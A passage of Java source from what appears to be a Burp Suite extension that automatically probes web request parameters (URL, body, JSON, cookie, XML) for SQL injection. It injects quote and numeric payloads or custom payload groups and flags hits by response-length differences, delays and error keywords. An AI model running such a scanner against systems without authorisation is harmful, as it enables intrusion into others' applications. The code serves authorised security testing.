            // 构建参数名称部分
            for (ParsedHttpParameter para : paraLists) {
                HttpParameterType type = para.type();
                if (type == HttpParameterType.URL || type == HttpParameterType.BODY ||
                    type == HttpParameterType.JSON || (isCookie >= 0 && type == HttpParameterType.COOKIE)) {
                    if (isAdd == 0) {
                        isAdd = 1;
                    }
                    tempData += "+" + para.name();

                    // 改进的JSON嵌套检测
                    if (type == HttpParameterType.JSON && request.hasParameters(HttpParameterType.JSON)) {
                        if (requestData == null) {
                            try {
                                requestData = request.bodyToString();
                                // 检测JSON嵌套
                                if (requestData != null) {
                                    api.logging().logToOutput("JSON数据：" + requestData);
                                    
                                    // 更准确的JSON结构分析
                                    JsonStructureInfo structureInfo = analyzeJsonStructure(requestData);
                                    
                                    if (structureInfo.hasNestedObjects || structureInfo.hasArrays || structureInfo.maxDepth > 1) {
                                        isAdd = 2;
                                        jsonCount++;
                                        api.logging().logToOutput("发现复杂JSON结构 - 嵌套对象: " + structureInfo.hasNestedObjects + 
                                                                ", 数组: " + structureInfo.hasArrays + 
                                                                ", 最大深度: " + structureInfo.maxDepth);
                                    }
                                }
                            } catch (Exception e) {
                                api.logging().logToOutput("JSON处理错误：" + e.getMessage());
                            }
                        }
                    }
                }
            }

            // 添加HTTP方法 
            tempData += "+" + request.method();
            api.logging().logToOutput("\\nMD5(\"" + tempData + "\")");
            md5Data = MD5(tempData);
            api.logging().logToOutput(md5Data);
            api.logging().logToOutput("原始URL：" + url);
            api.logging().logToOutput("处理后的tempData：" + tempData);

            // 检查是否已扫描过 
            for (RequestMd5 md5Item : log4Md5) {
                if (md5Item.md5Data.equals(md5Data)) {
                    if (toolFlag == 1024) { // 右键发送过来的请求不进行MD5验证
                        String timeTemp = String.valueOf(System.currentTimeMillis());
                        md5Data = MD5(timeTemp);
                    } else {
                        api.logging().logToOutput("已检查过的URL：" + url);
                        return;
                    }
                }
            }

            // 记录原始请求 - 移到参数过滤检查之后
            if (isAdd != 0) {
                // 先进行参数过滤检查
                List<ParsedHttpParameter> testableParams = new ArrayList<>();
                for (ParsedHttpParameter para : paraLists) {
                    HttpParameterType type = para.type();
                    if (type == HttpParameterType.URL || type == HttpParameterType.BODY ||
                        type == HttpParameterType.JSON || (isCookie >= 0 && type == HttpParameterType.COOKIE) ||
                        type == HttpParameterType.XML || type == HttpParameterType.XML_ATTRIBUTE ||
                        type == HttpParameterType.MULTIPART_ATTRIBUTE) {
                        testableParams.add(para);
                    }
                }

                // 根据参数过滤模式进行预过滤检查
                List<ParsedHttpParameter> filteredParams = new ArrayList<>();
                if (paramListMode == 1) { // 白名单模式
                    for (ParsedHttpParameter para : testableParams) {
                        if (whiteListParams.contains(para.name())) {
                            filteredParams.add(para);
                        }
                    }
                } else if (paramListMode == 2) { // 黑名单模式
                    for (ParsedHttpParameter para : testableParams) {
                        if (!blackListParams.contains(para.name())) {
                            filteredParams.add(para);
                        }
                    }
                } else { // 无过滤模式
                    filteredParams.addAll(testableParams);
                }

                // 根据用户选择决定是否排除追加参数
                if (enableAppendParams && !appendParamsText.isEmpty()) {
                    // 解析追加参数列表
                    String[] lines = appendParamsText.split("\n");
                    List<String> excludeParamNames = new ArrayList<>();
                    List<String> includeParamNames = new ArrayList<>();
                    
                    for (String line : lines) {
                        line = line.trim();
                        if (!line.isEmpty() && line.contains(":")) {
                            String[] parts = line.split(":", 2);
                            if (parts.length == 2) {
                                String paramName = parts[0].trim();
                                boolean shouldTest = appendParamsTestMap.getOrDefault(paramName, false);
                                if (shouldTest) {
                                    includeParamNames.add(paramName);
                                } else {
                                    excludeParamNames.add(paramName);
                                }
                            }
                        }
                    }
                    
                    // 排除不参与测试的追加参数
                    if (!excludeParamNames.isEmpty()) {
                        int originalSize = filteredParams.size();
                        filteredParams.removeIf(para -> excludeParamNames.contains(para.name()));
                        if (filteredParams.size() < originalSize) {
                            api.logging().logToOutput("已排除追加参数: " + String.join(", ", excludeParamNames) + " (不参与payload测试)");
                        }
                    }
                    
                    // 记录参与测试的追加参数
                    if (!includeParamNames.isEmpty()) {
                        api.logging().logToOutput("追加参数将参与payload测试: " + String.join(", ", includeParamNames));
                    }
                }

                // 如果没有可测试参数，直接返回，不记录到结果中
                if (filteredParams.isEmpty()) {
                    api.logging().logToOutput("无可测试参数，跳过此请求");
                    // 注意：不要移除MD5记录，避免重复处理同一请求
                    // 保持MD5记录，防止无限循环
                    return;
                }

                log4Md5.add(new RequestMd5(md5Data));
                api.logging().logToOutput("isAdd=" + isAdd);

                count++;
                dataMd5Id = md5Data;  // 一致的data_md5_id

                // 获取并存储原始响应长度，使用统一的计算方法
                int originalDataLen = calculateResponseLength(baseRequestResponse.response(), "原始响应");
                originalResponseLengths.put(md5Data, originalDataLen);

                LogEntry originalLogEntry = new LogEntry(
                    count,
                    toolFlag,
                    baseRequestResponse,
                    url,
                    "",
                    "",
                    "",
                    md5Data,
                    0,
                    "start",
                    baseRequestResponse.response() != null ? baseRequestResponse.response().statusCode() : 0
                );
                log.add(originalLogEntry);
                fireTableRowsInserted(log.size() - 1, log.size() - 1);

                api.logging().logToOutput("开始测试URL：" + url);
                api.logging().logToOutput("原始响应长度：" + originalDataLen);

                api.logging().logToOutput("参数总数：" + paraLists.size());
                api.logging().logToOutput("可测试参数数：" + testableParams.size());
                api.logging().logToOutput("过滤后参数数：" + filteredParams.size());

                // 获取URL问号前面的部分作为baseUrl
                String baseUrl = url.split("\\?")[0];

                // 测试每个参数 - 传递原始响应长度
                for (ParsedHttpParameter para : filteredParams) {
                    try {
                        testParameter(request, para, baseUrl, md5Data, originalDataLen);
                    } catch (Exception e) {
                        api.logging().logToOutput("测试参数时出错：" + e.getMessage());
                    }
                }

                api.logging().logToOutput("URL测试完成：" + url);

                // 更新状态为完成
                for (int i = 0; i < log.size(); i++) {
                    if (md5Data.equals(log.get(i).dataMd5)) {
                        // 检查是否有任何测试结果包含报错信息或时间超时
                        boolean hasAnyError = false;
                        boolean hasAnyTimeExceeded = false;
                        
                        for (LogEntry testEntry : log2) {
                            if (testEntry.dataMd5.equals(md5Data)) {
                                if (testEntry.hasError) {
                                    hasAnyError = true;
                                }
                                // 检查是否有时间超时（通过变化信息判断）
                                if (testEntry.change != null && testEntry.change.contains("time >")) {
                                    hasAnyTimeExceeded = true;
                                }
                            }
                        }

                        // 优先显示报错，其次显示时间超时
                        if (hasAnyError) {
                            log.get(i).setState("end! [err]");
                        } else if (hasAnyTimeExceeded) {
                            log.get(i).setState("end! [time]");
                        } else {
                            log.get(i).setState("end!");
                        }
                        fireTableDataChanged();
                        break;
                    }
                }
            }
        } catch (Exception e) {
            api.logging().logToOutput("checkVul错误：" + e.getMessage());
            e.printStackTrace();
            
            // 异常情况下也要更新状态为完成
            try {
                for (int i = 0; i < log.size(); i++) {
                    if (md5Data.equals(log.get(i).dataMd5)) {
                        log.get(i).setState("end!");
                        fireTableDataChanged();
                        break;
                    }
                }
            } catch (Exception ex) {
                api.logging().logToOutput("更新异常状态失败：" + ex.getMessage());
            }
        }
    }

    // 使用指定payload组进行漏洞检查的方法
    private void checkVulWithPayloadGroup(HttpRequestResponse baseRequestResponse, int toolFlag, String payloadGroup) {
        if (baseRequestResponse == null || baseRequestResponse.request() == null) {
            api.logging().logToOutput("检查漏洞：无效的请求");
            return;
        }

        // 临时保存当前的payload内容和相关变量
        String originalPayload = payloadTextArea.getText();
        String originalJTextAreaData1 = jTextAreaData1;
        String originalGroup = currentGroup;
        
        try {
            // 加载指定组的payload
            String groupPayload = loadPayloadGroup(payloadGroup);
            
            // 临时设置payload内容到UI和变量
            payloadTextArea.setText(groupPayload);
            
            // 根据空格编码设置更新jTextAreaData1变量
            if (diyPayload1 == 1) {
                String temp = groupPayload.replaceAll(" ", "%20");
                jTextAreaData1 = temp;
            } else {
                jTextAreaData1 = groupPayload;
            }
            
            api.logging().logToOutput("使用payload组 '" + payloadGroup + "' 进行检测，payload行数: " + groupPayload.split("\\n").length);
            
            // 调用原始的checkVul方法
            checkVul(baseRequestResponse, toolFlag);
            
        } finally {
            // 恢复原始的payload内容和变量
            payloadTextArea.setText(originalPayload);
            jTextAreaData1 = originalJTextAreaData1;
            api.logging().logToOutput("已恢复原始payload组 '" + originalGroup + "'");
        }
    }
    
    // 从原始请求字节流中提取参数值的辅助方法
    private String extractRawParameterValue(String requestString, String paramName, HttpParameterType paramType) {
        try {
            if (paramType == HttpParameterType.URL) {
                // 从URL查询字符串中提取
                String[] lines = requestString.split("\n");
                if (lines.length > 0) {
                    String requestLine = lines[0]; // GET /path?param=value HTTP/1.1
                    if (requestLine.contains("?")) {
                        String queryString = requestLine.split("\\?")[1].split(" ")[0];
                        String[] params = queryString.split("&");
                        for (String param : params) {
                            if (param.startsWith(paramName + "=")) {
                                return param.substring(paramName.length() + 1);
                            }
                        }
                    }
                }
            } else if (paramType == HttpParameterType.BODY) {
                // 从POST请求体中提取
                String[] parts = requestString.split("\r\n\r\n", 2);
                if (parts.length > 1) {
                    String body = parts[1];
                    // 处理application/x-www-form-urlencoded格式
                    if (body.contains("&") || body.contains("=")) {
                        String[] params = body.split("&");
                        for (String param : params) {
                            if (param.startsWith(paramName + "=")) {
                                return param.substring(paramName.length() + 1);
                            }
                        }
                    }
                    // 处理单个参数的情况
                    if (body.startsWith(paramName + "=")) {
                        return body.substring(paramName.length() + 1);
                    }
                }
            }
        } catch (Exception e) {
            api.logging().logToOutput("提取原始参数值失败: " + e.getMessage());
        }
        return null;
    }
    
    // 从原始请求字节流中提取参数值（多编码支持版本）
    private String extractRawParameterValueSafe(HttpRequest originalRequest, String paramName, HttpParameterType paramType) {
        try {
            // 获取原始请求的字节数组
            byte[] requestBytes = originalRequest.toByteArray().getBytes();
            
            // 尝试多种编码方式
            String[] encodings = {"UTF-8", "GBK", "GB2312", "ISO-8859-1", "Windows-1252"};
            
            for (String encoding : encodings) {
                try {
                    String requestString = new String(requestBytes, encoding);
                    String extractedValue = extractParameterFromString(requestString, paramName, paramType);
                    
                    if (extractedValue != null) {
                        // 检查提取的值是否包含正常的中文字符
                        boolean hasChinese = extractedValue.matches(".*[\\u4e00-\\u9fa5].*");
                        boolean hasValidChars = !extractedValue.matches(".*[\\uFFFD\\u00C0-\\u00FF].*"); // 检查是否有乱码字符
                        
                        api.logging().logToOutput("编码 " + encoding + " 提取结果: " + extractedValue + 
                                                " (包含中文: " + hasChinese + ", 无乱码: " + hasValidChars + ")");
                        
                        if (hasChinese && hasValidChars) {
                            api.logging().logToOutput("使用编码 " + encoding + " 成功提取中文参数");
                            return extractedValue;
                        }
                    }
                } catch (Exception e) {
                    api.logging().logToOutput("编码 " + encoding + " 处理失败: " + e.getMessage());
                }
            }
            
            // 如果所有编码都没有找到中文，返回UTF-8的结果作为默认值
            try {
                String requestString = new String(requestBytes, "UTF-8");
                return extractParameterFromString(requestString, paramName, paramType);
            } catch (Exception e) {
                api.logging().logToOutput("默认UTF-8编码也失败: " + e.getMessage());
            }
            
        } catch (Exception e) {
            api.logging().logToOutput("多编码参数提取失败: " + e.getMessage());
        }
        return null;
    }
    
    // 从字符串中提取参数值的通用方法
    private String extractParameterFromString(String requestString, String paramName, HttpParameterType paramType) {
        try {
            if (paramType == HttpParameterType.URL) {
                // 从URL查询字符串中提取
                String[] lines = requestString.split("\n");
                if (lines.length > 0) {
                    String requestLine = lines[0];
                    if (requestLine.contains("?")) {
                        String queryString = requestLine.split("\\?")[1].split(" ")[0];
                        String[] params = queryString.split("&");
                        for (String param : params) {
                            if (param.startsWith(paramName + "=")) {
                                String rawValue = param.substring(paramName.length() + 1);
                                // 尝试URL解码
                                try {
                                    return java.net.URLDecoder.decode(rawValue, "UTF-8");
                                } catch (Exception e) {
                                    return rawValue;
                                }
                            }
                        }
                    }
                }
            } else if (paramType == HttpParameterType.BODY) {
                // 从POST请求体中提取
                String[] parts = requestString.split("\r\n\r\n", 2);
                if (parts.length > 1) {
                    String body = parts[1];
                    
                    // 处理application/x-www-form-urlencoded格式
                    if (body.contains("&") || body.contains("=")) {
                        String[] params = body.split("&");
                        for (String param : params) {
                            if (param.startsWith(paramName + "=")) {
                                String rawValue = param.substring(paramName.length() + 1);
                                // 尝试URL解码
                                try {
                                    return java.net.URLDecoder.decode(rawValue, "UTF-8");
                                } catch (Exception e) {
                                    return rawValue;
                                }
                            }
                        }
                    }
                    
                    // 处理单个参数的情况
                    if (body.startsWith(paramName + "=")) {
                        String rawValue = body.substring(paramName.length() + 1);
                        try {
                            return java.net.URLDecoder.decode(rawValue, "UTF-8");
                        } catch (Exception e) {
                            return rawValue;
                        }
                    }
                }
            }
        } catch (Exception e) {
            // 忽略异常，返回null
        }
        return null;
    }

    private void testParameter(HttpRequest originalRequest, ParsedHttpParameter parameter, String baseUrl, String requestMd5Id, int originalDataLen) {
        try {
            String paramName = parameter.name();
            String originalValue = parameter.value();
            HttpParameterType paramType = parameter.type();

            // 完全按照test.txt的方法进行中文编码修复
            byte[] bytes = originalValue.getBytes(StandardCharsets.ISO_8859_1);
            String workingValue = new String(bytes, StandardCharsets.UTF_8);
            
            // 调试信息 - 特别关注JSON参数
            api.logging().logToOutput("\n=== 参数编码调试信息 ===");
            api.logging().logToOutput("参数名: " + paramName);
            api.logging().logToOutput("参数类型: " + paramType);
            api.logging().logToOutput("原始数据: " + paramName + ":" + workingValue);
            
            // 对于JSON参数，添加额外的调试信息
            if (paramType == HttpParameterType.JSON) {
                api.logging().logToOutput("JSON参数特殊调试:");
                api.logging().logToOutput("  原始值: " + originalValue);
                api.logging().logToOutput("  原始值字节: " + java.util.Arrays.toString(originalValue.getBytes(StandardCharsets.UTF_8)));
                api.logging().logToOutput("  ISO-8859-1字节: " + java.util.Arrays.toString(bytes));
                api.logging().logToOutput("  修复后值: " + workingValue);
                api.logging().logToOutput("  修复后字节: " + java.util.Arrays.toString(workingValue.getBytes(StandardCharsets.UTF_8)));
                
                // 检查是否包含中文字符
                boolean originalHasChinese = originalValue.matches(".*[\\u4e00-\\u9fa5].*");
                boolean workingHasChinese = workingValue.matches(".*[\\u4e00-\\u9fa5].*");
                api.logging().logToOutput("  原始值包含中文: " + originalHasChinese);
                api.logging().logToOutput("  修复后包含中文: " + workingHasChinese);
                
                // 如果原始值已经包含中文，可能不需要修复
                if (originalHasChinese && !workingHasChinese) {
                    api.logging().logToOutput("  警告：修复后中文字符丢失，使用原始值");
                    workingValue = originalValue;
                } else if (originalHasChinese && workingHasChinese) {
                    api.logging().logToOutput("  注意：原始值和修复后值都包含中文，使用原始值");
                    workingValue = originalValue;
                }
            }
            
            api.logging().logToOutput("最终使用值: " + workingValue);
            api.logging().logToOutput("=== 编码调试信息结束 ===\n");

            // 基础payload列表 
            List<String> payloads = new ArrayList<>();
            payloads.add("'");       // 单引号
            payloads.add("''");      // 双引号

            // 数字参数测试 
            if (isInt == 1 && workingValue.matches("[0-9]+")) {
                payloads.add("-1");
                payloads.add("-0");
            }

            // 在每个参数测试开始时重置第一个payload的响应长度 - 使用局部变量避免竞态
            final Map<String, Integer> firstPayloadLengths = new ConcurrentHashMap<>();

            // 自定义payload 
            if (jTextAreaInt == 1 && !jTextAreaData1.isEmpty()) {
                String[] customPayloads = jTextAreaData1.split("\\n");
                for (String payload : customPayloads) {
                    payload = payload.trim();
                    if (!payload.isEmpty()) {
                        String testValue;
                        // 参数值置空逻辑 
                        if (diyPayload2 == 1 && !payload.equals("'") &&
                            !payload.equals("''") && !payload.equals("-1") && !payload.equals("-0")) {
                            // 对于自定义payload，将原始值置为空
                            testValue = payload;
                        } else {
                            // 使用处理后的值进行拼接，保持中文字符的正确性
                            testValue = workingValue + payload;
                        }
                        
                        // 传递原始响应长度和第一个payload长度映射
                        sendTestRequest(originalRequest, paramName, paramType, testValue, payload, baseUrl, 
                                      firstPayloadLengths, requestMd5Id, workingValue, originalDataLen);
                    }
                }
            } else {
                // 使用默认payload
                for (String payload : payloads) {
                    String testValue = workingValue + payload;
                    sendTestRequest(originalRequest, paramName, paramType, testValue, payload, baseUrl, 
                                  firstPayloadLengths, requestMd5Id, workingValue, originalDataLen);
                }
            }

        } catch (Exception e) {
            api.logging().logToOutput("测试参数错误：" + e.getMessage());
            e.printStackTrace();
        }
    }

    private void sendTestRequest(HttpRequest originalRequest, String paramName, HttpParameterType paramType,
                                 String newValue, String payload, String baseUrl, Map<String, Integer> firstPayloadLengths, 
                                 String requestMd5Id, String workingValue, int originalDataLen) {
        try {
            HttpRequest testRequest = null;
            boolean skipTest = false;

            // 特殊处理JSON参数
            if (paramType == HttpParameterType.JSON) {
                // 对于JSON参数，需要解析JSON并对特定字段进行修改
                String jsonBody = originalRequest.bodyToString();
                if (jsonBody != null && !jsonBody.trim().isEmpty()) {
                    // 改进的JSON修改逻辑，支持多种数据类型
                    String modifiedJson = replaceJsonValue(jsonBody, paramName, newValue);
                    
                    if (!modifiedJson.equals(jsonBody)) {
                        // 创建新请求 - 使用UTF-8字节数组确保中文字符正确编码
                        try {
                            byte[] jsonBytes = modifiedJson.getBytes(StandardCharsets.UTF_8);
                            testRequest = originalRequest.withBody(burp.api.montoya.core.ByteArray.byteArray(jsonBytes));
                            api.logging().logToOutput("  -> JSON参数替换成功（UTF-8编码）：" + paramName);
                            api.logging().logToOutput("  -> 修改后的JSON字节长度：" + jsonBytes.length);
                        } catch (Exception e) {
                            // 如果字节数组方法失败，回退到字符串方法
                            testRequest = originalRequest.withBody(modifiedJson);
                            api.logging().logToOutput("  -> JSON参数替换成功（字符串方法）：" + paramName);
                            api.logging().logToOutput("  -> 警告：可能存在中文编码问题");
                        }
                    } else {
                        // 如果替换失败，尝试使用原始的参数更新方法
                        api.logging().logToOutput("  -> JSON字符串替换失败，尝试使用参数更新方法：" + paramName);
                        try {
                            testRequest = originalRequest.withUpdatedParameters(
                                burp.api.montoya.http.message.params.HttpParameter.parameter(paramName, newValue, paramType)
                            );
                        } catch (Exception e) {
                            api.logging().logToOutput("      -> 参数更新方法也失败，跳过：" + paramName + " - " + e.getMessage());
                            return;
                        }
                    }
                } else {
                    // JSON体为空，跳过
                    api.logging().logToOutput("      -> JSON体为空，跳过参数：" + paramName);
                    return;
                }
            } else {
                // 对于XML、MULTIPART_ATTRIBUTE和其他类型参数，使用改进的参数更新方法
                testRequest = updateParameterSafely(originalRequest, paramName, newValue, paramType);
                if (testRequest == null) {
                    api.logging().logToOutput("  -> 安全参数更新失败，跳过：" + paramName);
                    return;
                }
            }

            api.logging().logToOutput("  -> 发送payload：" + payload + " (新值：" + newValue + ")");

            // 应用延时配置
            applyRequestDelay();

            // 记录开始时间（如果需要计时）
            long startTime = System.currentTimeMillis();

            // 发送测试请求
            HttpRequestResponse testResponse = api.http().sendRequest(testRequest);

            long endTime = System.currentTimeMillis();
            long responseTime = endTime - startTime;

            // 验证响应完整性并添加调试信息
            if (testResponse == null) {
                api.logging().logToOutput("错误: testResponse为null，跳过此次测试");
                return;
            }
            
            // 详细验证HttpRequestResponse对象
            boolean hasRequest = testResponse.request() != null;
            boolean hasResponse = testResponse.response() != null;
            
            if (!hasRequest) {
                api.logging().logToOutput("警告: testResponse.request()为null");
            }
            if (!hasResponse) {
                api.logging().logToOutput("警告: testResponse.response()为null");
                // 如果响应为null，跳过此次测试
                return;
            }
            
            // 如果请求为null，尝试使用原始请求重新构建
            if (!hasRequest) {
                try {
                    api.logging().logToOutput("尝试重新构建HttpRequestResponse对象");
                    testResponse = HttpRequestResponse.httpRequestResponse(testRequest, testResponse.response());
                    api.logging().logToOutput("HttpRequestResponse对象重新构建成功");
                } catch (Exception e) {
                    api.logging().logToOutput("重新构建HttpRequestResponse失败: " + e.getMessage());
                    return;
                }
            }

            // 获取响应信息 - 使用统一的响应长度计算方法
            int responseCode = testResponse.response() != null ? testResponse.response().statusCode() : 0;
            int responseLength = calculateResponseLength(testResponse.response(), "测试响应");
            
            api.logging().logToOutput("    响应长度计算结果：" + responseLength + ", 原始长度=" + originalDataLen);

            // 判断变化 - 修复：使用局部变量和线程安全的映射
            String change;
            boolean isTimeExceeded = responseTime >= responseTimeThreshold;
            
            // 调试信息
            api.logging().logToOutput("    时间检测：响应时间=" + responseTime + "ms, 阈值=" + responseTimeThreshold + "ms, 超时=" + isTimeExceeded);
            
            // 优先检查响应时间超时
            if (isTimeExceeded) {
                change = "time > " + (responseTimeThreshold / 1000);
            } else if (responseLength == 0) {
                change = "无响应";
            } else if (payload.equals("'") || payload.equals("-1")) {
                // 第一个payload，记录响应长度到线程安全的映射中
                String firstPayloadKey = requestMd5Id + "_" + paramName;
                firstPayloadLengths.put(firstPayloadKey, responseLength);
                
                // 检查与原始长度的差异
                int diff = responseLength - originalDataLen;
                int absDiff = Math.abs(diff);
                if (absDiff >= lengthDiffThreshold) {
                    change = "diff: " + (diff > 0 ? "+" : "") + diff;
                } else {
                    change = "";
                }
            } else {
                // 后续payload，从映射中获取第一个payload的长度
                String firstPayloadKey = requestMd5Id + "_" + paramName;
                Integer firstPayloadResponseLength = firstPayloadLengths.get(firstPayloadKey);
                if (firstPayloadResponseLength == null) {
                    firstPayloadResponseLength = originalDataLen; // 如果没有找到，使用原始长度
                }
                
                // 先检查与原始长度的差异
                int diffWithOriginal = responseLength - originalDataLen;
                int absDiffWithOriginal = Math.abs(diffWithOriginal);
                boolean hasSignificantDiffWithOriginal = absDiffWithOriginal >= lengthDiffThreshold;

                // 检查与第一个payload的差异
                int diffWithFirst = responseLength - firstPayloadResponseLength;
                int absDiffWithFirst = Math.abs(diffWithFirst);
                boolean hasSignificantDiffWithFirst = absDiffWithFirst >= lengthDiffThreshold;

                if (payload.equals("''") || payload.equals("-0")) {
                    if (hasSignificantDiffWithFirst) {
                        // 第一个payload和第二个payload的长度有显著差异
                        if ((payload.equals("''") && responseLength == originalDataLen) ||
                            (payload.equals("-0") && responseLength == originalDataLen)) {
                            // 第二个payload的响应长度与原始长度相同，可能是SQL注入
                            change = "✔ ==> ?";
                        } else {
                            // 普通长度不同
                            change = "✔ " + (firstPayloadResponseLength - responseLength);
                        }
                    } else {
                        // 与第一个payload长度差异不大，检查与原始长度的差异
                        if (hasSignificantDiffWithOriginal) {
                            change = "diff: " + (diffWithOriginal > 0 ? "+" : "") + diffWithOriginal;
                        } else {
                            // 长度相同
                            change = "";
                        }
                    }
                } else {
                    // 非标准payload（包括自定义payload和payload组中的payload）
                    // 检查长度差异
                    if (hasSignificantDiffWithOriginal) {
                        change = "diff: " + (diffWithOriginal > 0 ? "+" : "") + diffWithOriginal;
                    } else {
                        // 根据payload来源显示不同标记
                        if (jTextAreaInt == 1) {
                            change = "diy payload";
                        } else {
                            change = ""; // payload组中的payload，不显示特殊标记
                        }
                    }
                }
            }

            // 检测报错信息
            boolean hasError = false;
            if (enableCustomError == 1 && !errorKeywordsList.isEmpty() && testResponse.response() != null) {
                String responseBody = testResponse.response().bodyToString();
                if (responseBody != null) {
                    for (String keyword : errorKeywordsList) {
                        if (responseBody.toLowerCase().contains(keyword.toLowerCase())) {
                            hasError = true;
                            api.logging().logToOutput("检测到报错信息关键字: " + keyword);
                            break;
                        }
                    }
                }
            }

            // 如果检测到报错信息，在原变化信息前面添加ERR!标记
            if (hasError) {
                if (change.isEmpty()) {
                    change = "ERR!";
                } else {
                    change = "ERR! " + change;
                }
            }

            // 判断状态
            String state;
            if (responseCode >= 200 && responseCode < 300) {
                state = "正常";
            } else if (responseCode >= 400 && responseCode < 500) {
                state = "客户端错误";
            } else if (responseCode >= 500) {
                state = "服务器错误";
            } else {
                state = "其他(" + responseCode + ")";
            }

            // 记录测试结果到log2 
            LogEntry testLogEntry = new LogEntry(
                count,
                clicksRepeater,
                testResponse,
                baseUrl,
                paramName,
                workingValue + payload,  // 直接使用修复后的值+payload，就像test.txt那样
                change,
                requestMd5Id,  // 使用传入的MD5值，避免全局变量问题
                (int)responseTime,
                state,
                responseCode
            );
            
            // 验证LogEntry中的响应数据
            if (testLogEntry.requestResponse != null) {
                boolean hasReq = testLogEntry.requestResponse.request() != null;
                boolean hasResp = testLogEntry.requestResponse.response() != null;
                int respLen = hasResp ? testLogEntry.requestResponse.response().body().length() : 0;
                api.logging().logToOutput("LogEntry验证: 请求=" + hasReq + ", 响应=" + hasResp + ", 长度=" + respLen);
            } else {
                api.logging().logToOutput("LogEntry验证: requestResponse为null");
            }
            
            // 设置报错信息状态
            testLogEntry.hasError = hasError;

            // 线程安全地添加测试结果
            log2.add(testLogEntry);

            // 如果检测到报错信息，更新原始请求的状态
            if (hasError) {
                updateOriginalRequestState(requestMd5Id, "error");
            }
            
            // 如果检测到时间超时，更新原始请求的状态（仅在没有报错的情况下）
            if (!hasError && isTimeExceeded) {
                updateOriginalRequestState(requestMd5Id, "timeout");
            }

            // 如果当前选中了这个原始请求，更新payload表格
            updatePayloadTableIfSelected(requestMd5Id);

            api.logging().logToOutput("    响应：代码=" + responseCode + ", 长度=" + responseLength +
                                    ", 时间=" + responseTime + "ms, 变化=" + change);

            // 添加调试信息
            if (api.logging() != null) {
                debugCurrentState("测试完成", requestMd5Id);
            }

        } catch (Exception e) {
            api.logging().logToOutput("发送测试请求错误：" + e.getMessage());
            e.printStackTrace();
        }
    }

    // 线程安全地更新原始请求状态
    private void updateOriginalRequestState(String requestMd5Id, String updateType) {
        SwingUtilities.invokeLater(() -> {
            synchronized (log) {
                for (int i = 0; i < log.size(); i++) {
                    LogEntry originalEntry = log.get(i);
                    if (originalEntry.dataMd5.equals(requestMd5Id)) {
                        if ("error".equals(updateType)) {
                            originalEntry.hasAnyError = true;
                            // 如果已经完成，更新状态显示报错标记
                            if (originalEntry.state.startsWith("end")) {
                                originalEntry.setState("end! [err]");
                            } else if (originalEntry.state.equals("start")) {
                                // start状态下添加报错标记，但仍显示为start
                                originalEntry.setState("start [err]");
                            }
                        } else if ("timeout".equals(updateType)) {
                            // 只有在没有报错标记的情况下才添加时间标记
                            if (originalEntry.state.startsWith("end") && !originalEntry.state.contains("[err]")) {
                                originalEntry.setState("end! [time]");
                            } else if (originalEntry.state.equals("start") && !originalEntry.state.contains("[err]")) {
                                originalEntry.setState("start [time]");
                            }
                        }
                        fireTableDataChanged();
                        break;
                    }
                }
            }
        });
    }

    // 线程安全地更新payload表格（如果当前选中了对应的请求）
    private void updatePayloadTableIfSelected(String requestMd5Id) {
        SwingUtilities.invokeLater(() -> {
            final String currentSelectedMd5 = dataMd5Id;
            if (currentSelectedMd5 != null && currentSelectedMd5.equals(requestMd5Id)) {
                // 在EDT线程中安全更新UI
                synchronized (log3) {
                    log3.clear();
                    synchronized (log2) {
                        for (LogEntry entry : log2) {
                            if (entry.dataMd5.equals(currentSelectedMd5)) {
                                log3.add(entry);
                            }
                        }
                    }
                }
                model.fireTableDataChanged();
            }
        });
    }

    // 刷新左侧表格数据
    private void fireTableRowsInserted(int firstRow, int lastRow) {
        SwingUtilities.invokeLater(() -> {
            if (logTable != null && logTable.getModel() instanceof AbstractTableModel) {
                ((AbstractTableModel) logTable.getModel()).fireTableRowsInserted(firstRow, lastRow);
            }
        });
    }

    // 刷新左侧表格所有数据
    private void fireTableDataChanged() {
        SwingUtilities.invokeLater(() -> {
            if (logTable != null && logTable.getModel() instanceof AbstractTableModel) {
                ((AbstractTableModel) logTable.getModel()).fireTableDataChanged();
            }
        });
    }

    // 内部类：表格 
    private class Table extends JTable {

        public Table(TableModel tableModel) {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            // 显示选中行的日志条目 - 改进线程安全性
            if (row >= 0 && row < log.size()) {
                LogEntry logEntry;
                synchronized (log) {
                    if (row >= log.size()) {
                        // 防止并发修改导致的索引越界
                        super.changeSelection(row, col, toggle, extend);
                        return;
                    }
                    logEntry = log.get(row);
                }
                
                // 使用局部变量避免竞态条件
                final String selectedMd5 = logEntry.dataMd5;
                final int selectedId = logEntry.id;
                final HttpRequestResponse selectedRequestResponse = logEntry.requestResponse;
                
                // 更新全局选择状态
                dataMd5Id = selectedMd5;
                selectRow = selectedId;

                // 在EDT线程中安全更新UI
                SwingUtilities.invokeLater(() -> {
                    // 清空并重新填充log3
                    synchronized (log3) {
                        log3.clear();
                        synchronized (log2) {
                            for (LogEntry entry : log2) {
                                if (entry.dataMd5.equals(selectedMd5)) {
                                    log3.add(entry);
                                }
                            }
                        }
                    }
                    
                    // 刷新payload表格
                    model.fireTableDataChanged();
                });

                // 设置消息查看器内容
                if (selectedRequestResponse != null) {
                    SwingUtilities.invokeLater(() -> {
                        try {
                            // 验证编辑器是否可用
                            if (requestViewer == null || responseViewer == null) {
                                api.logging().logToOutput("警告: 请求或响应编辑器为null");
                                return;
                            }
                            
                            // 设置请求
                            if (selectedRequestResponse.request() != null) {
                                try {
                                    api.logging().logToOutput("正在设置请求到编辑器...");
                                    requestViewer.setRequest(selectedRequestResponse.request());
                                    api.logging().logToOutput("请求设置成功");
                                } catch (Exception e) {
                                    api.logging().logToOutput("设置请求失败: " + e.getMessage());
                                    e.printStackTrace();
                                }
                            } else {
                                api.logging().logToOutput("警告: 选中条目的请求为null");
                            }
                            
                            // 设置响应
                            if (selectedRequestResponse.response() != null) {
                                try {
                                    api.logging().logToOutput("正在设置响应到编辑器...");
                                    responseViewer.setResponse(selectedRequestResponse.response());
                                    api.logging().logToOutput("响应设置成功");
                                    
                                    // 强制刷新UI组件
                                    Component responseComponent = responseViewer.uiComponent();
                                    if (responseComponent != null) {
                                        responseComponent.revalidate();
                                        responseComponent.repaint();
                                        api.logging().logToOutput("响应编辑器UI已刷新");
                                    }
                                } catch (Exception e) {
                                    api.logging().logToOutput("设置响应失败: " + e.getMessage());
                                    e.printStackTrace();
                                }
                            } else {
                                api.logging().logToOutput("警告: 选中条目的响应为null");
                                // 尝试清空响应查看器
                                try {
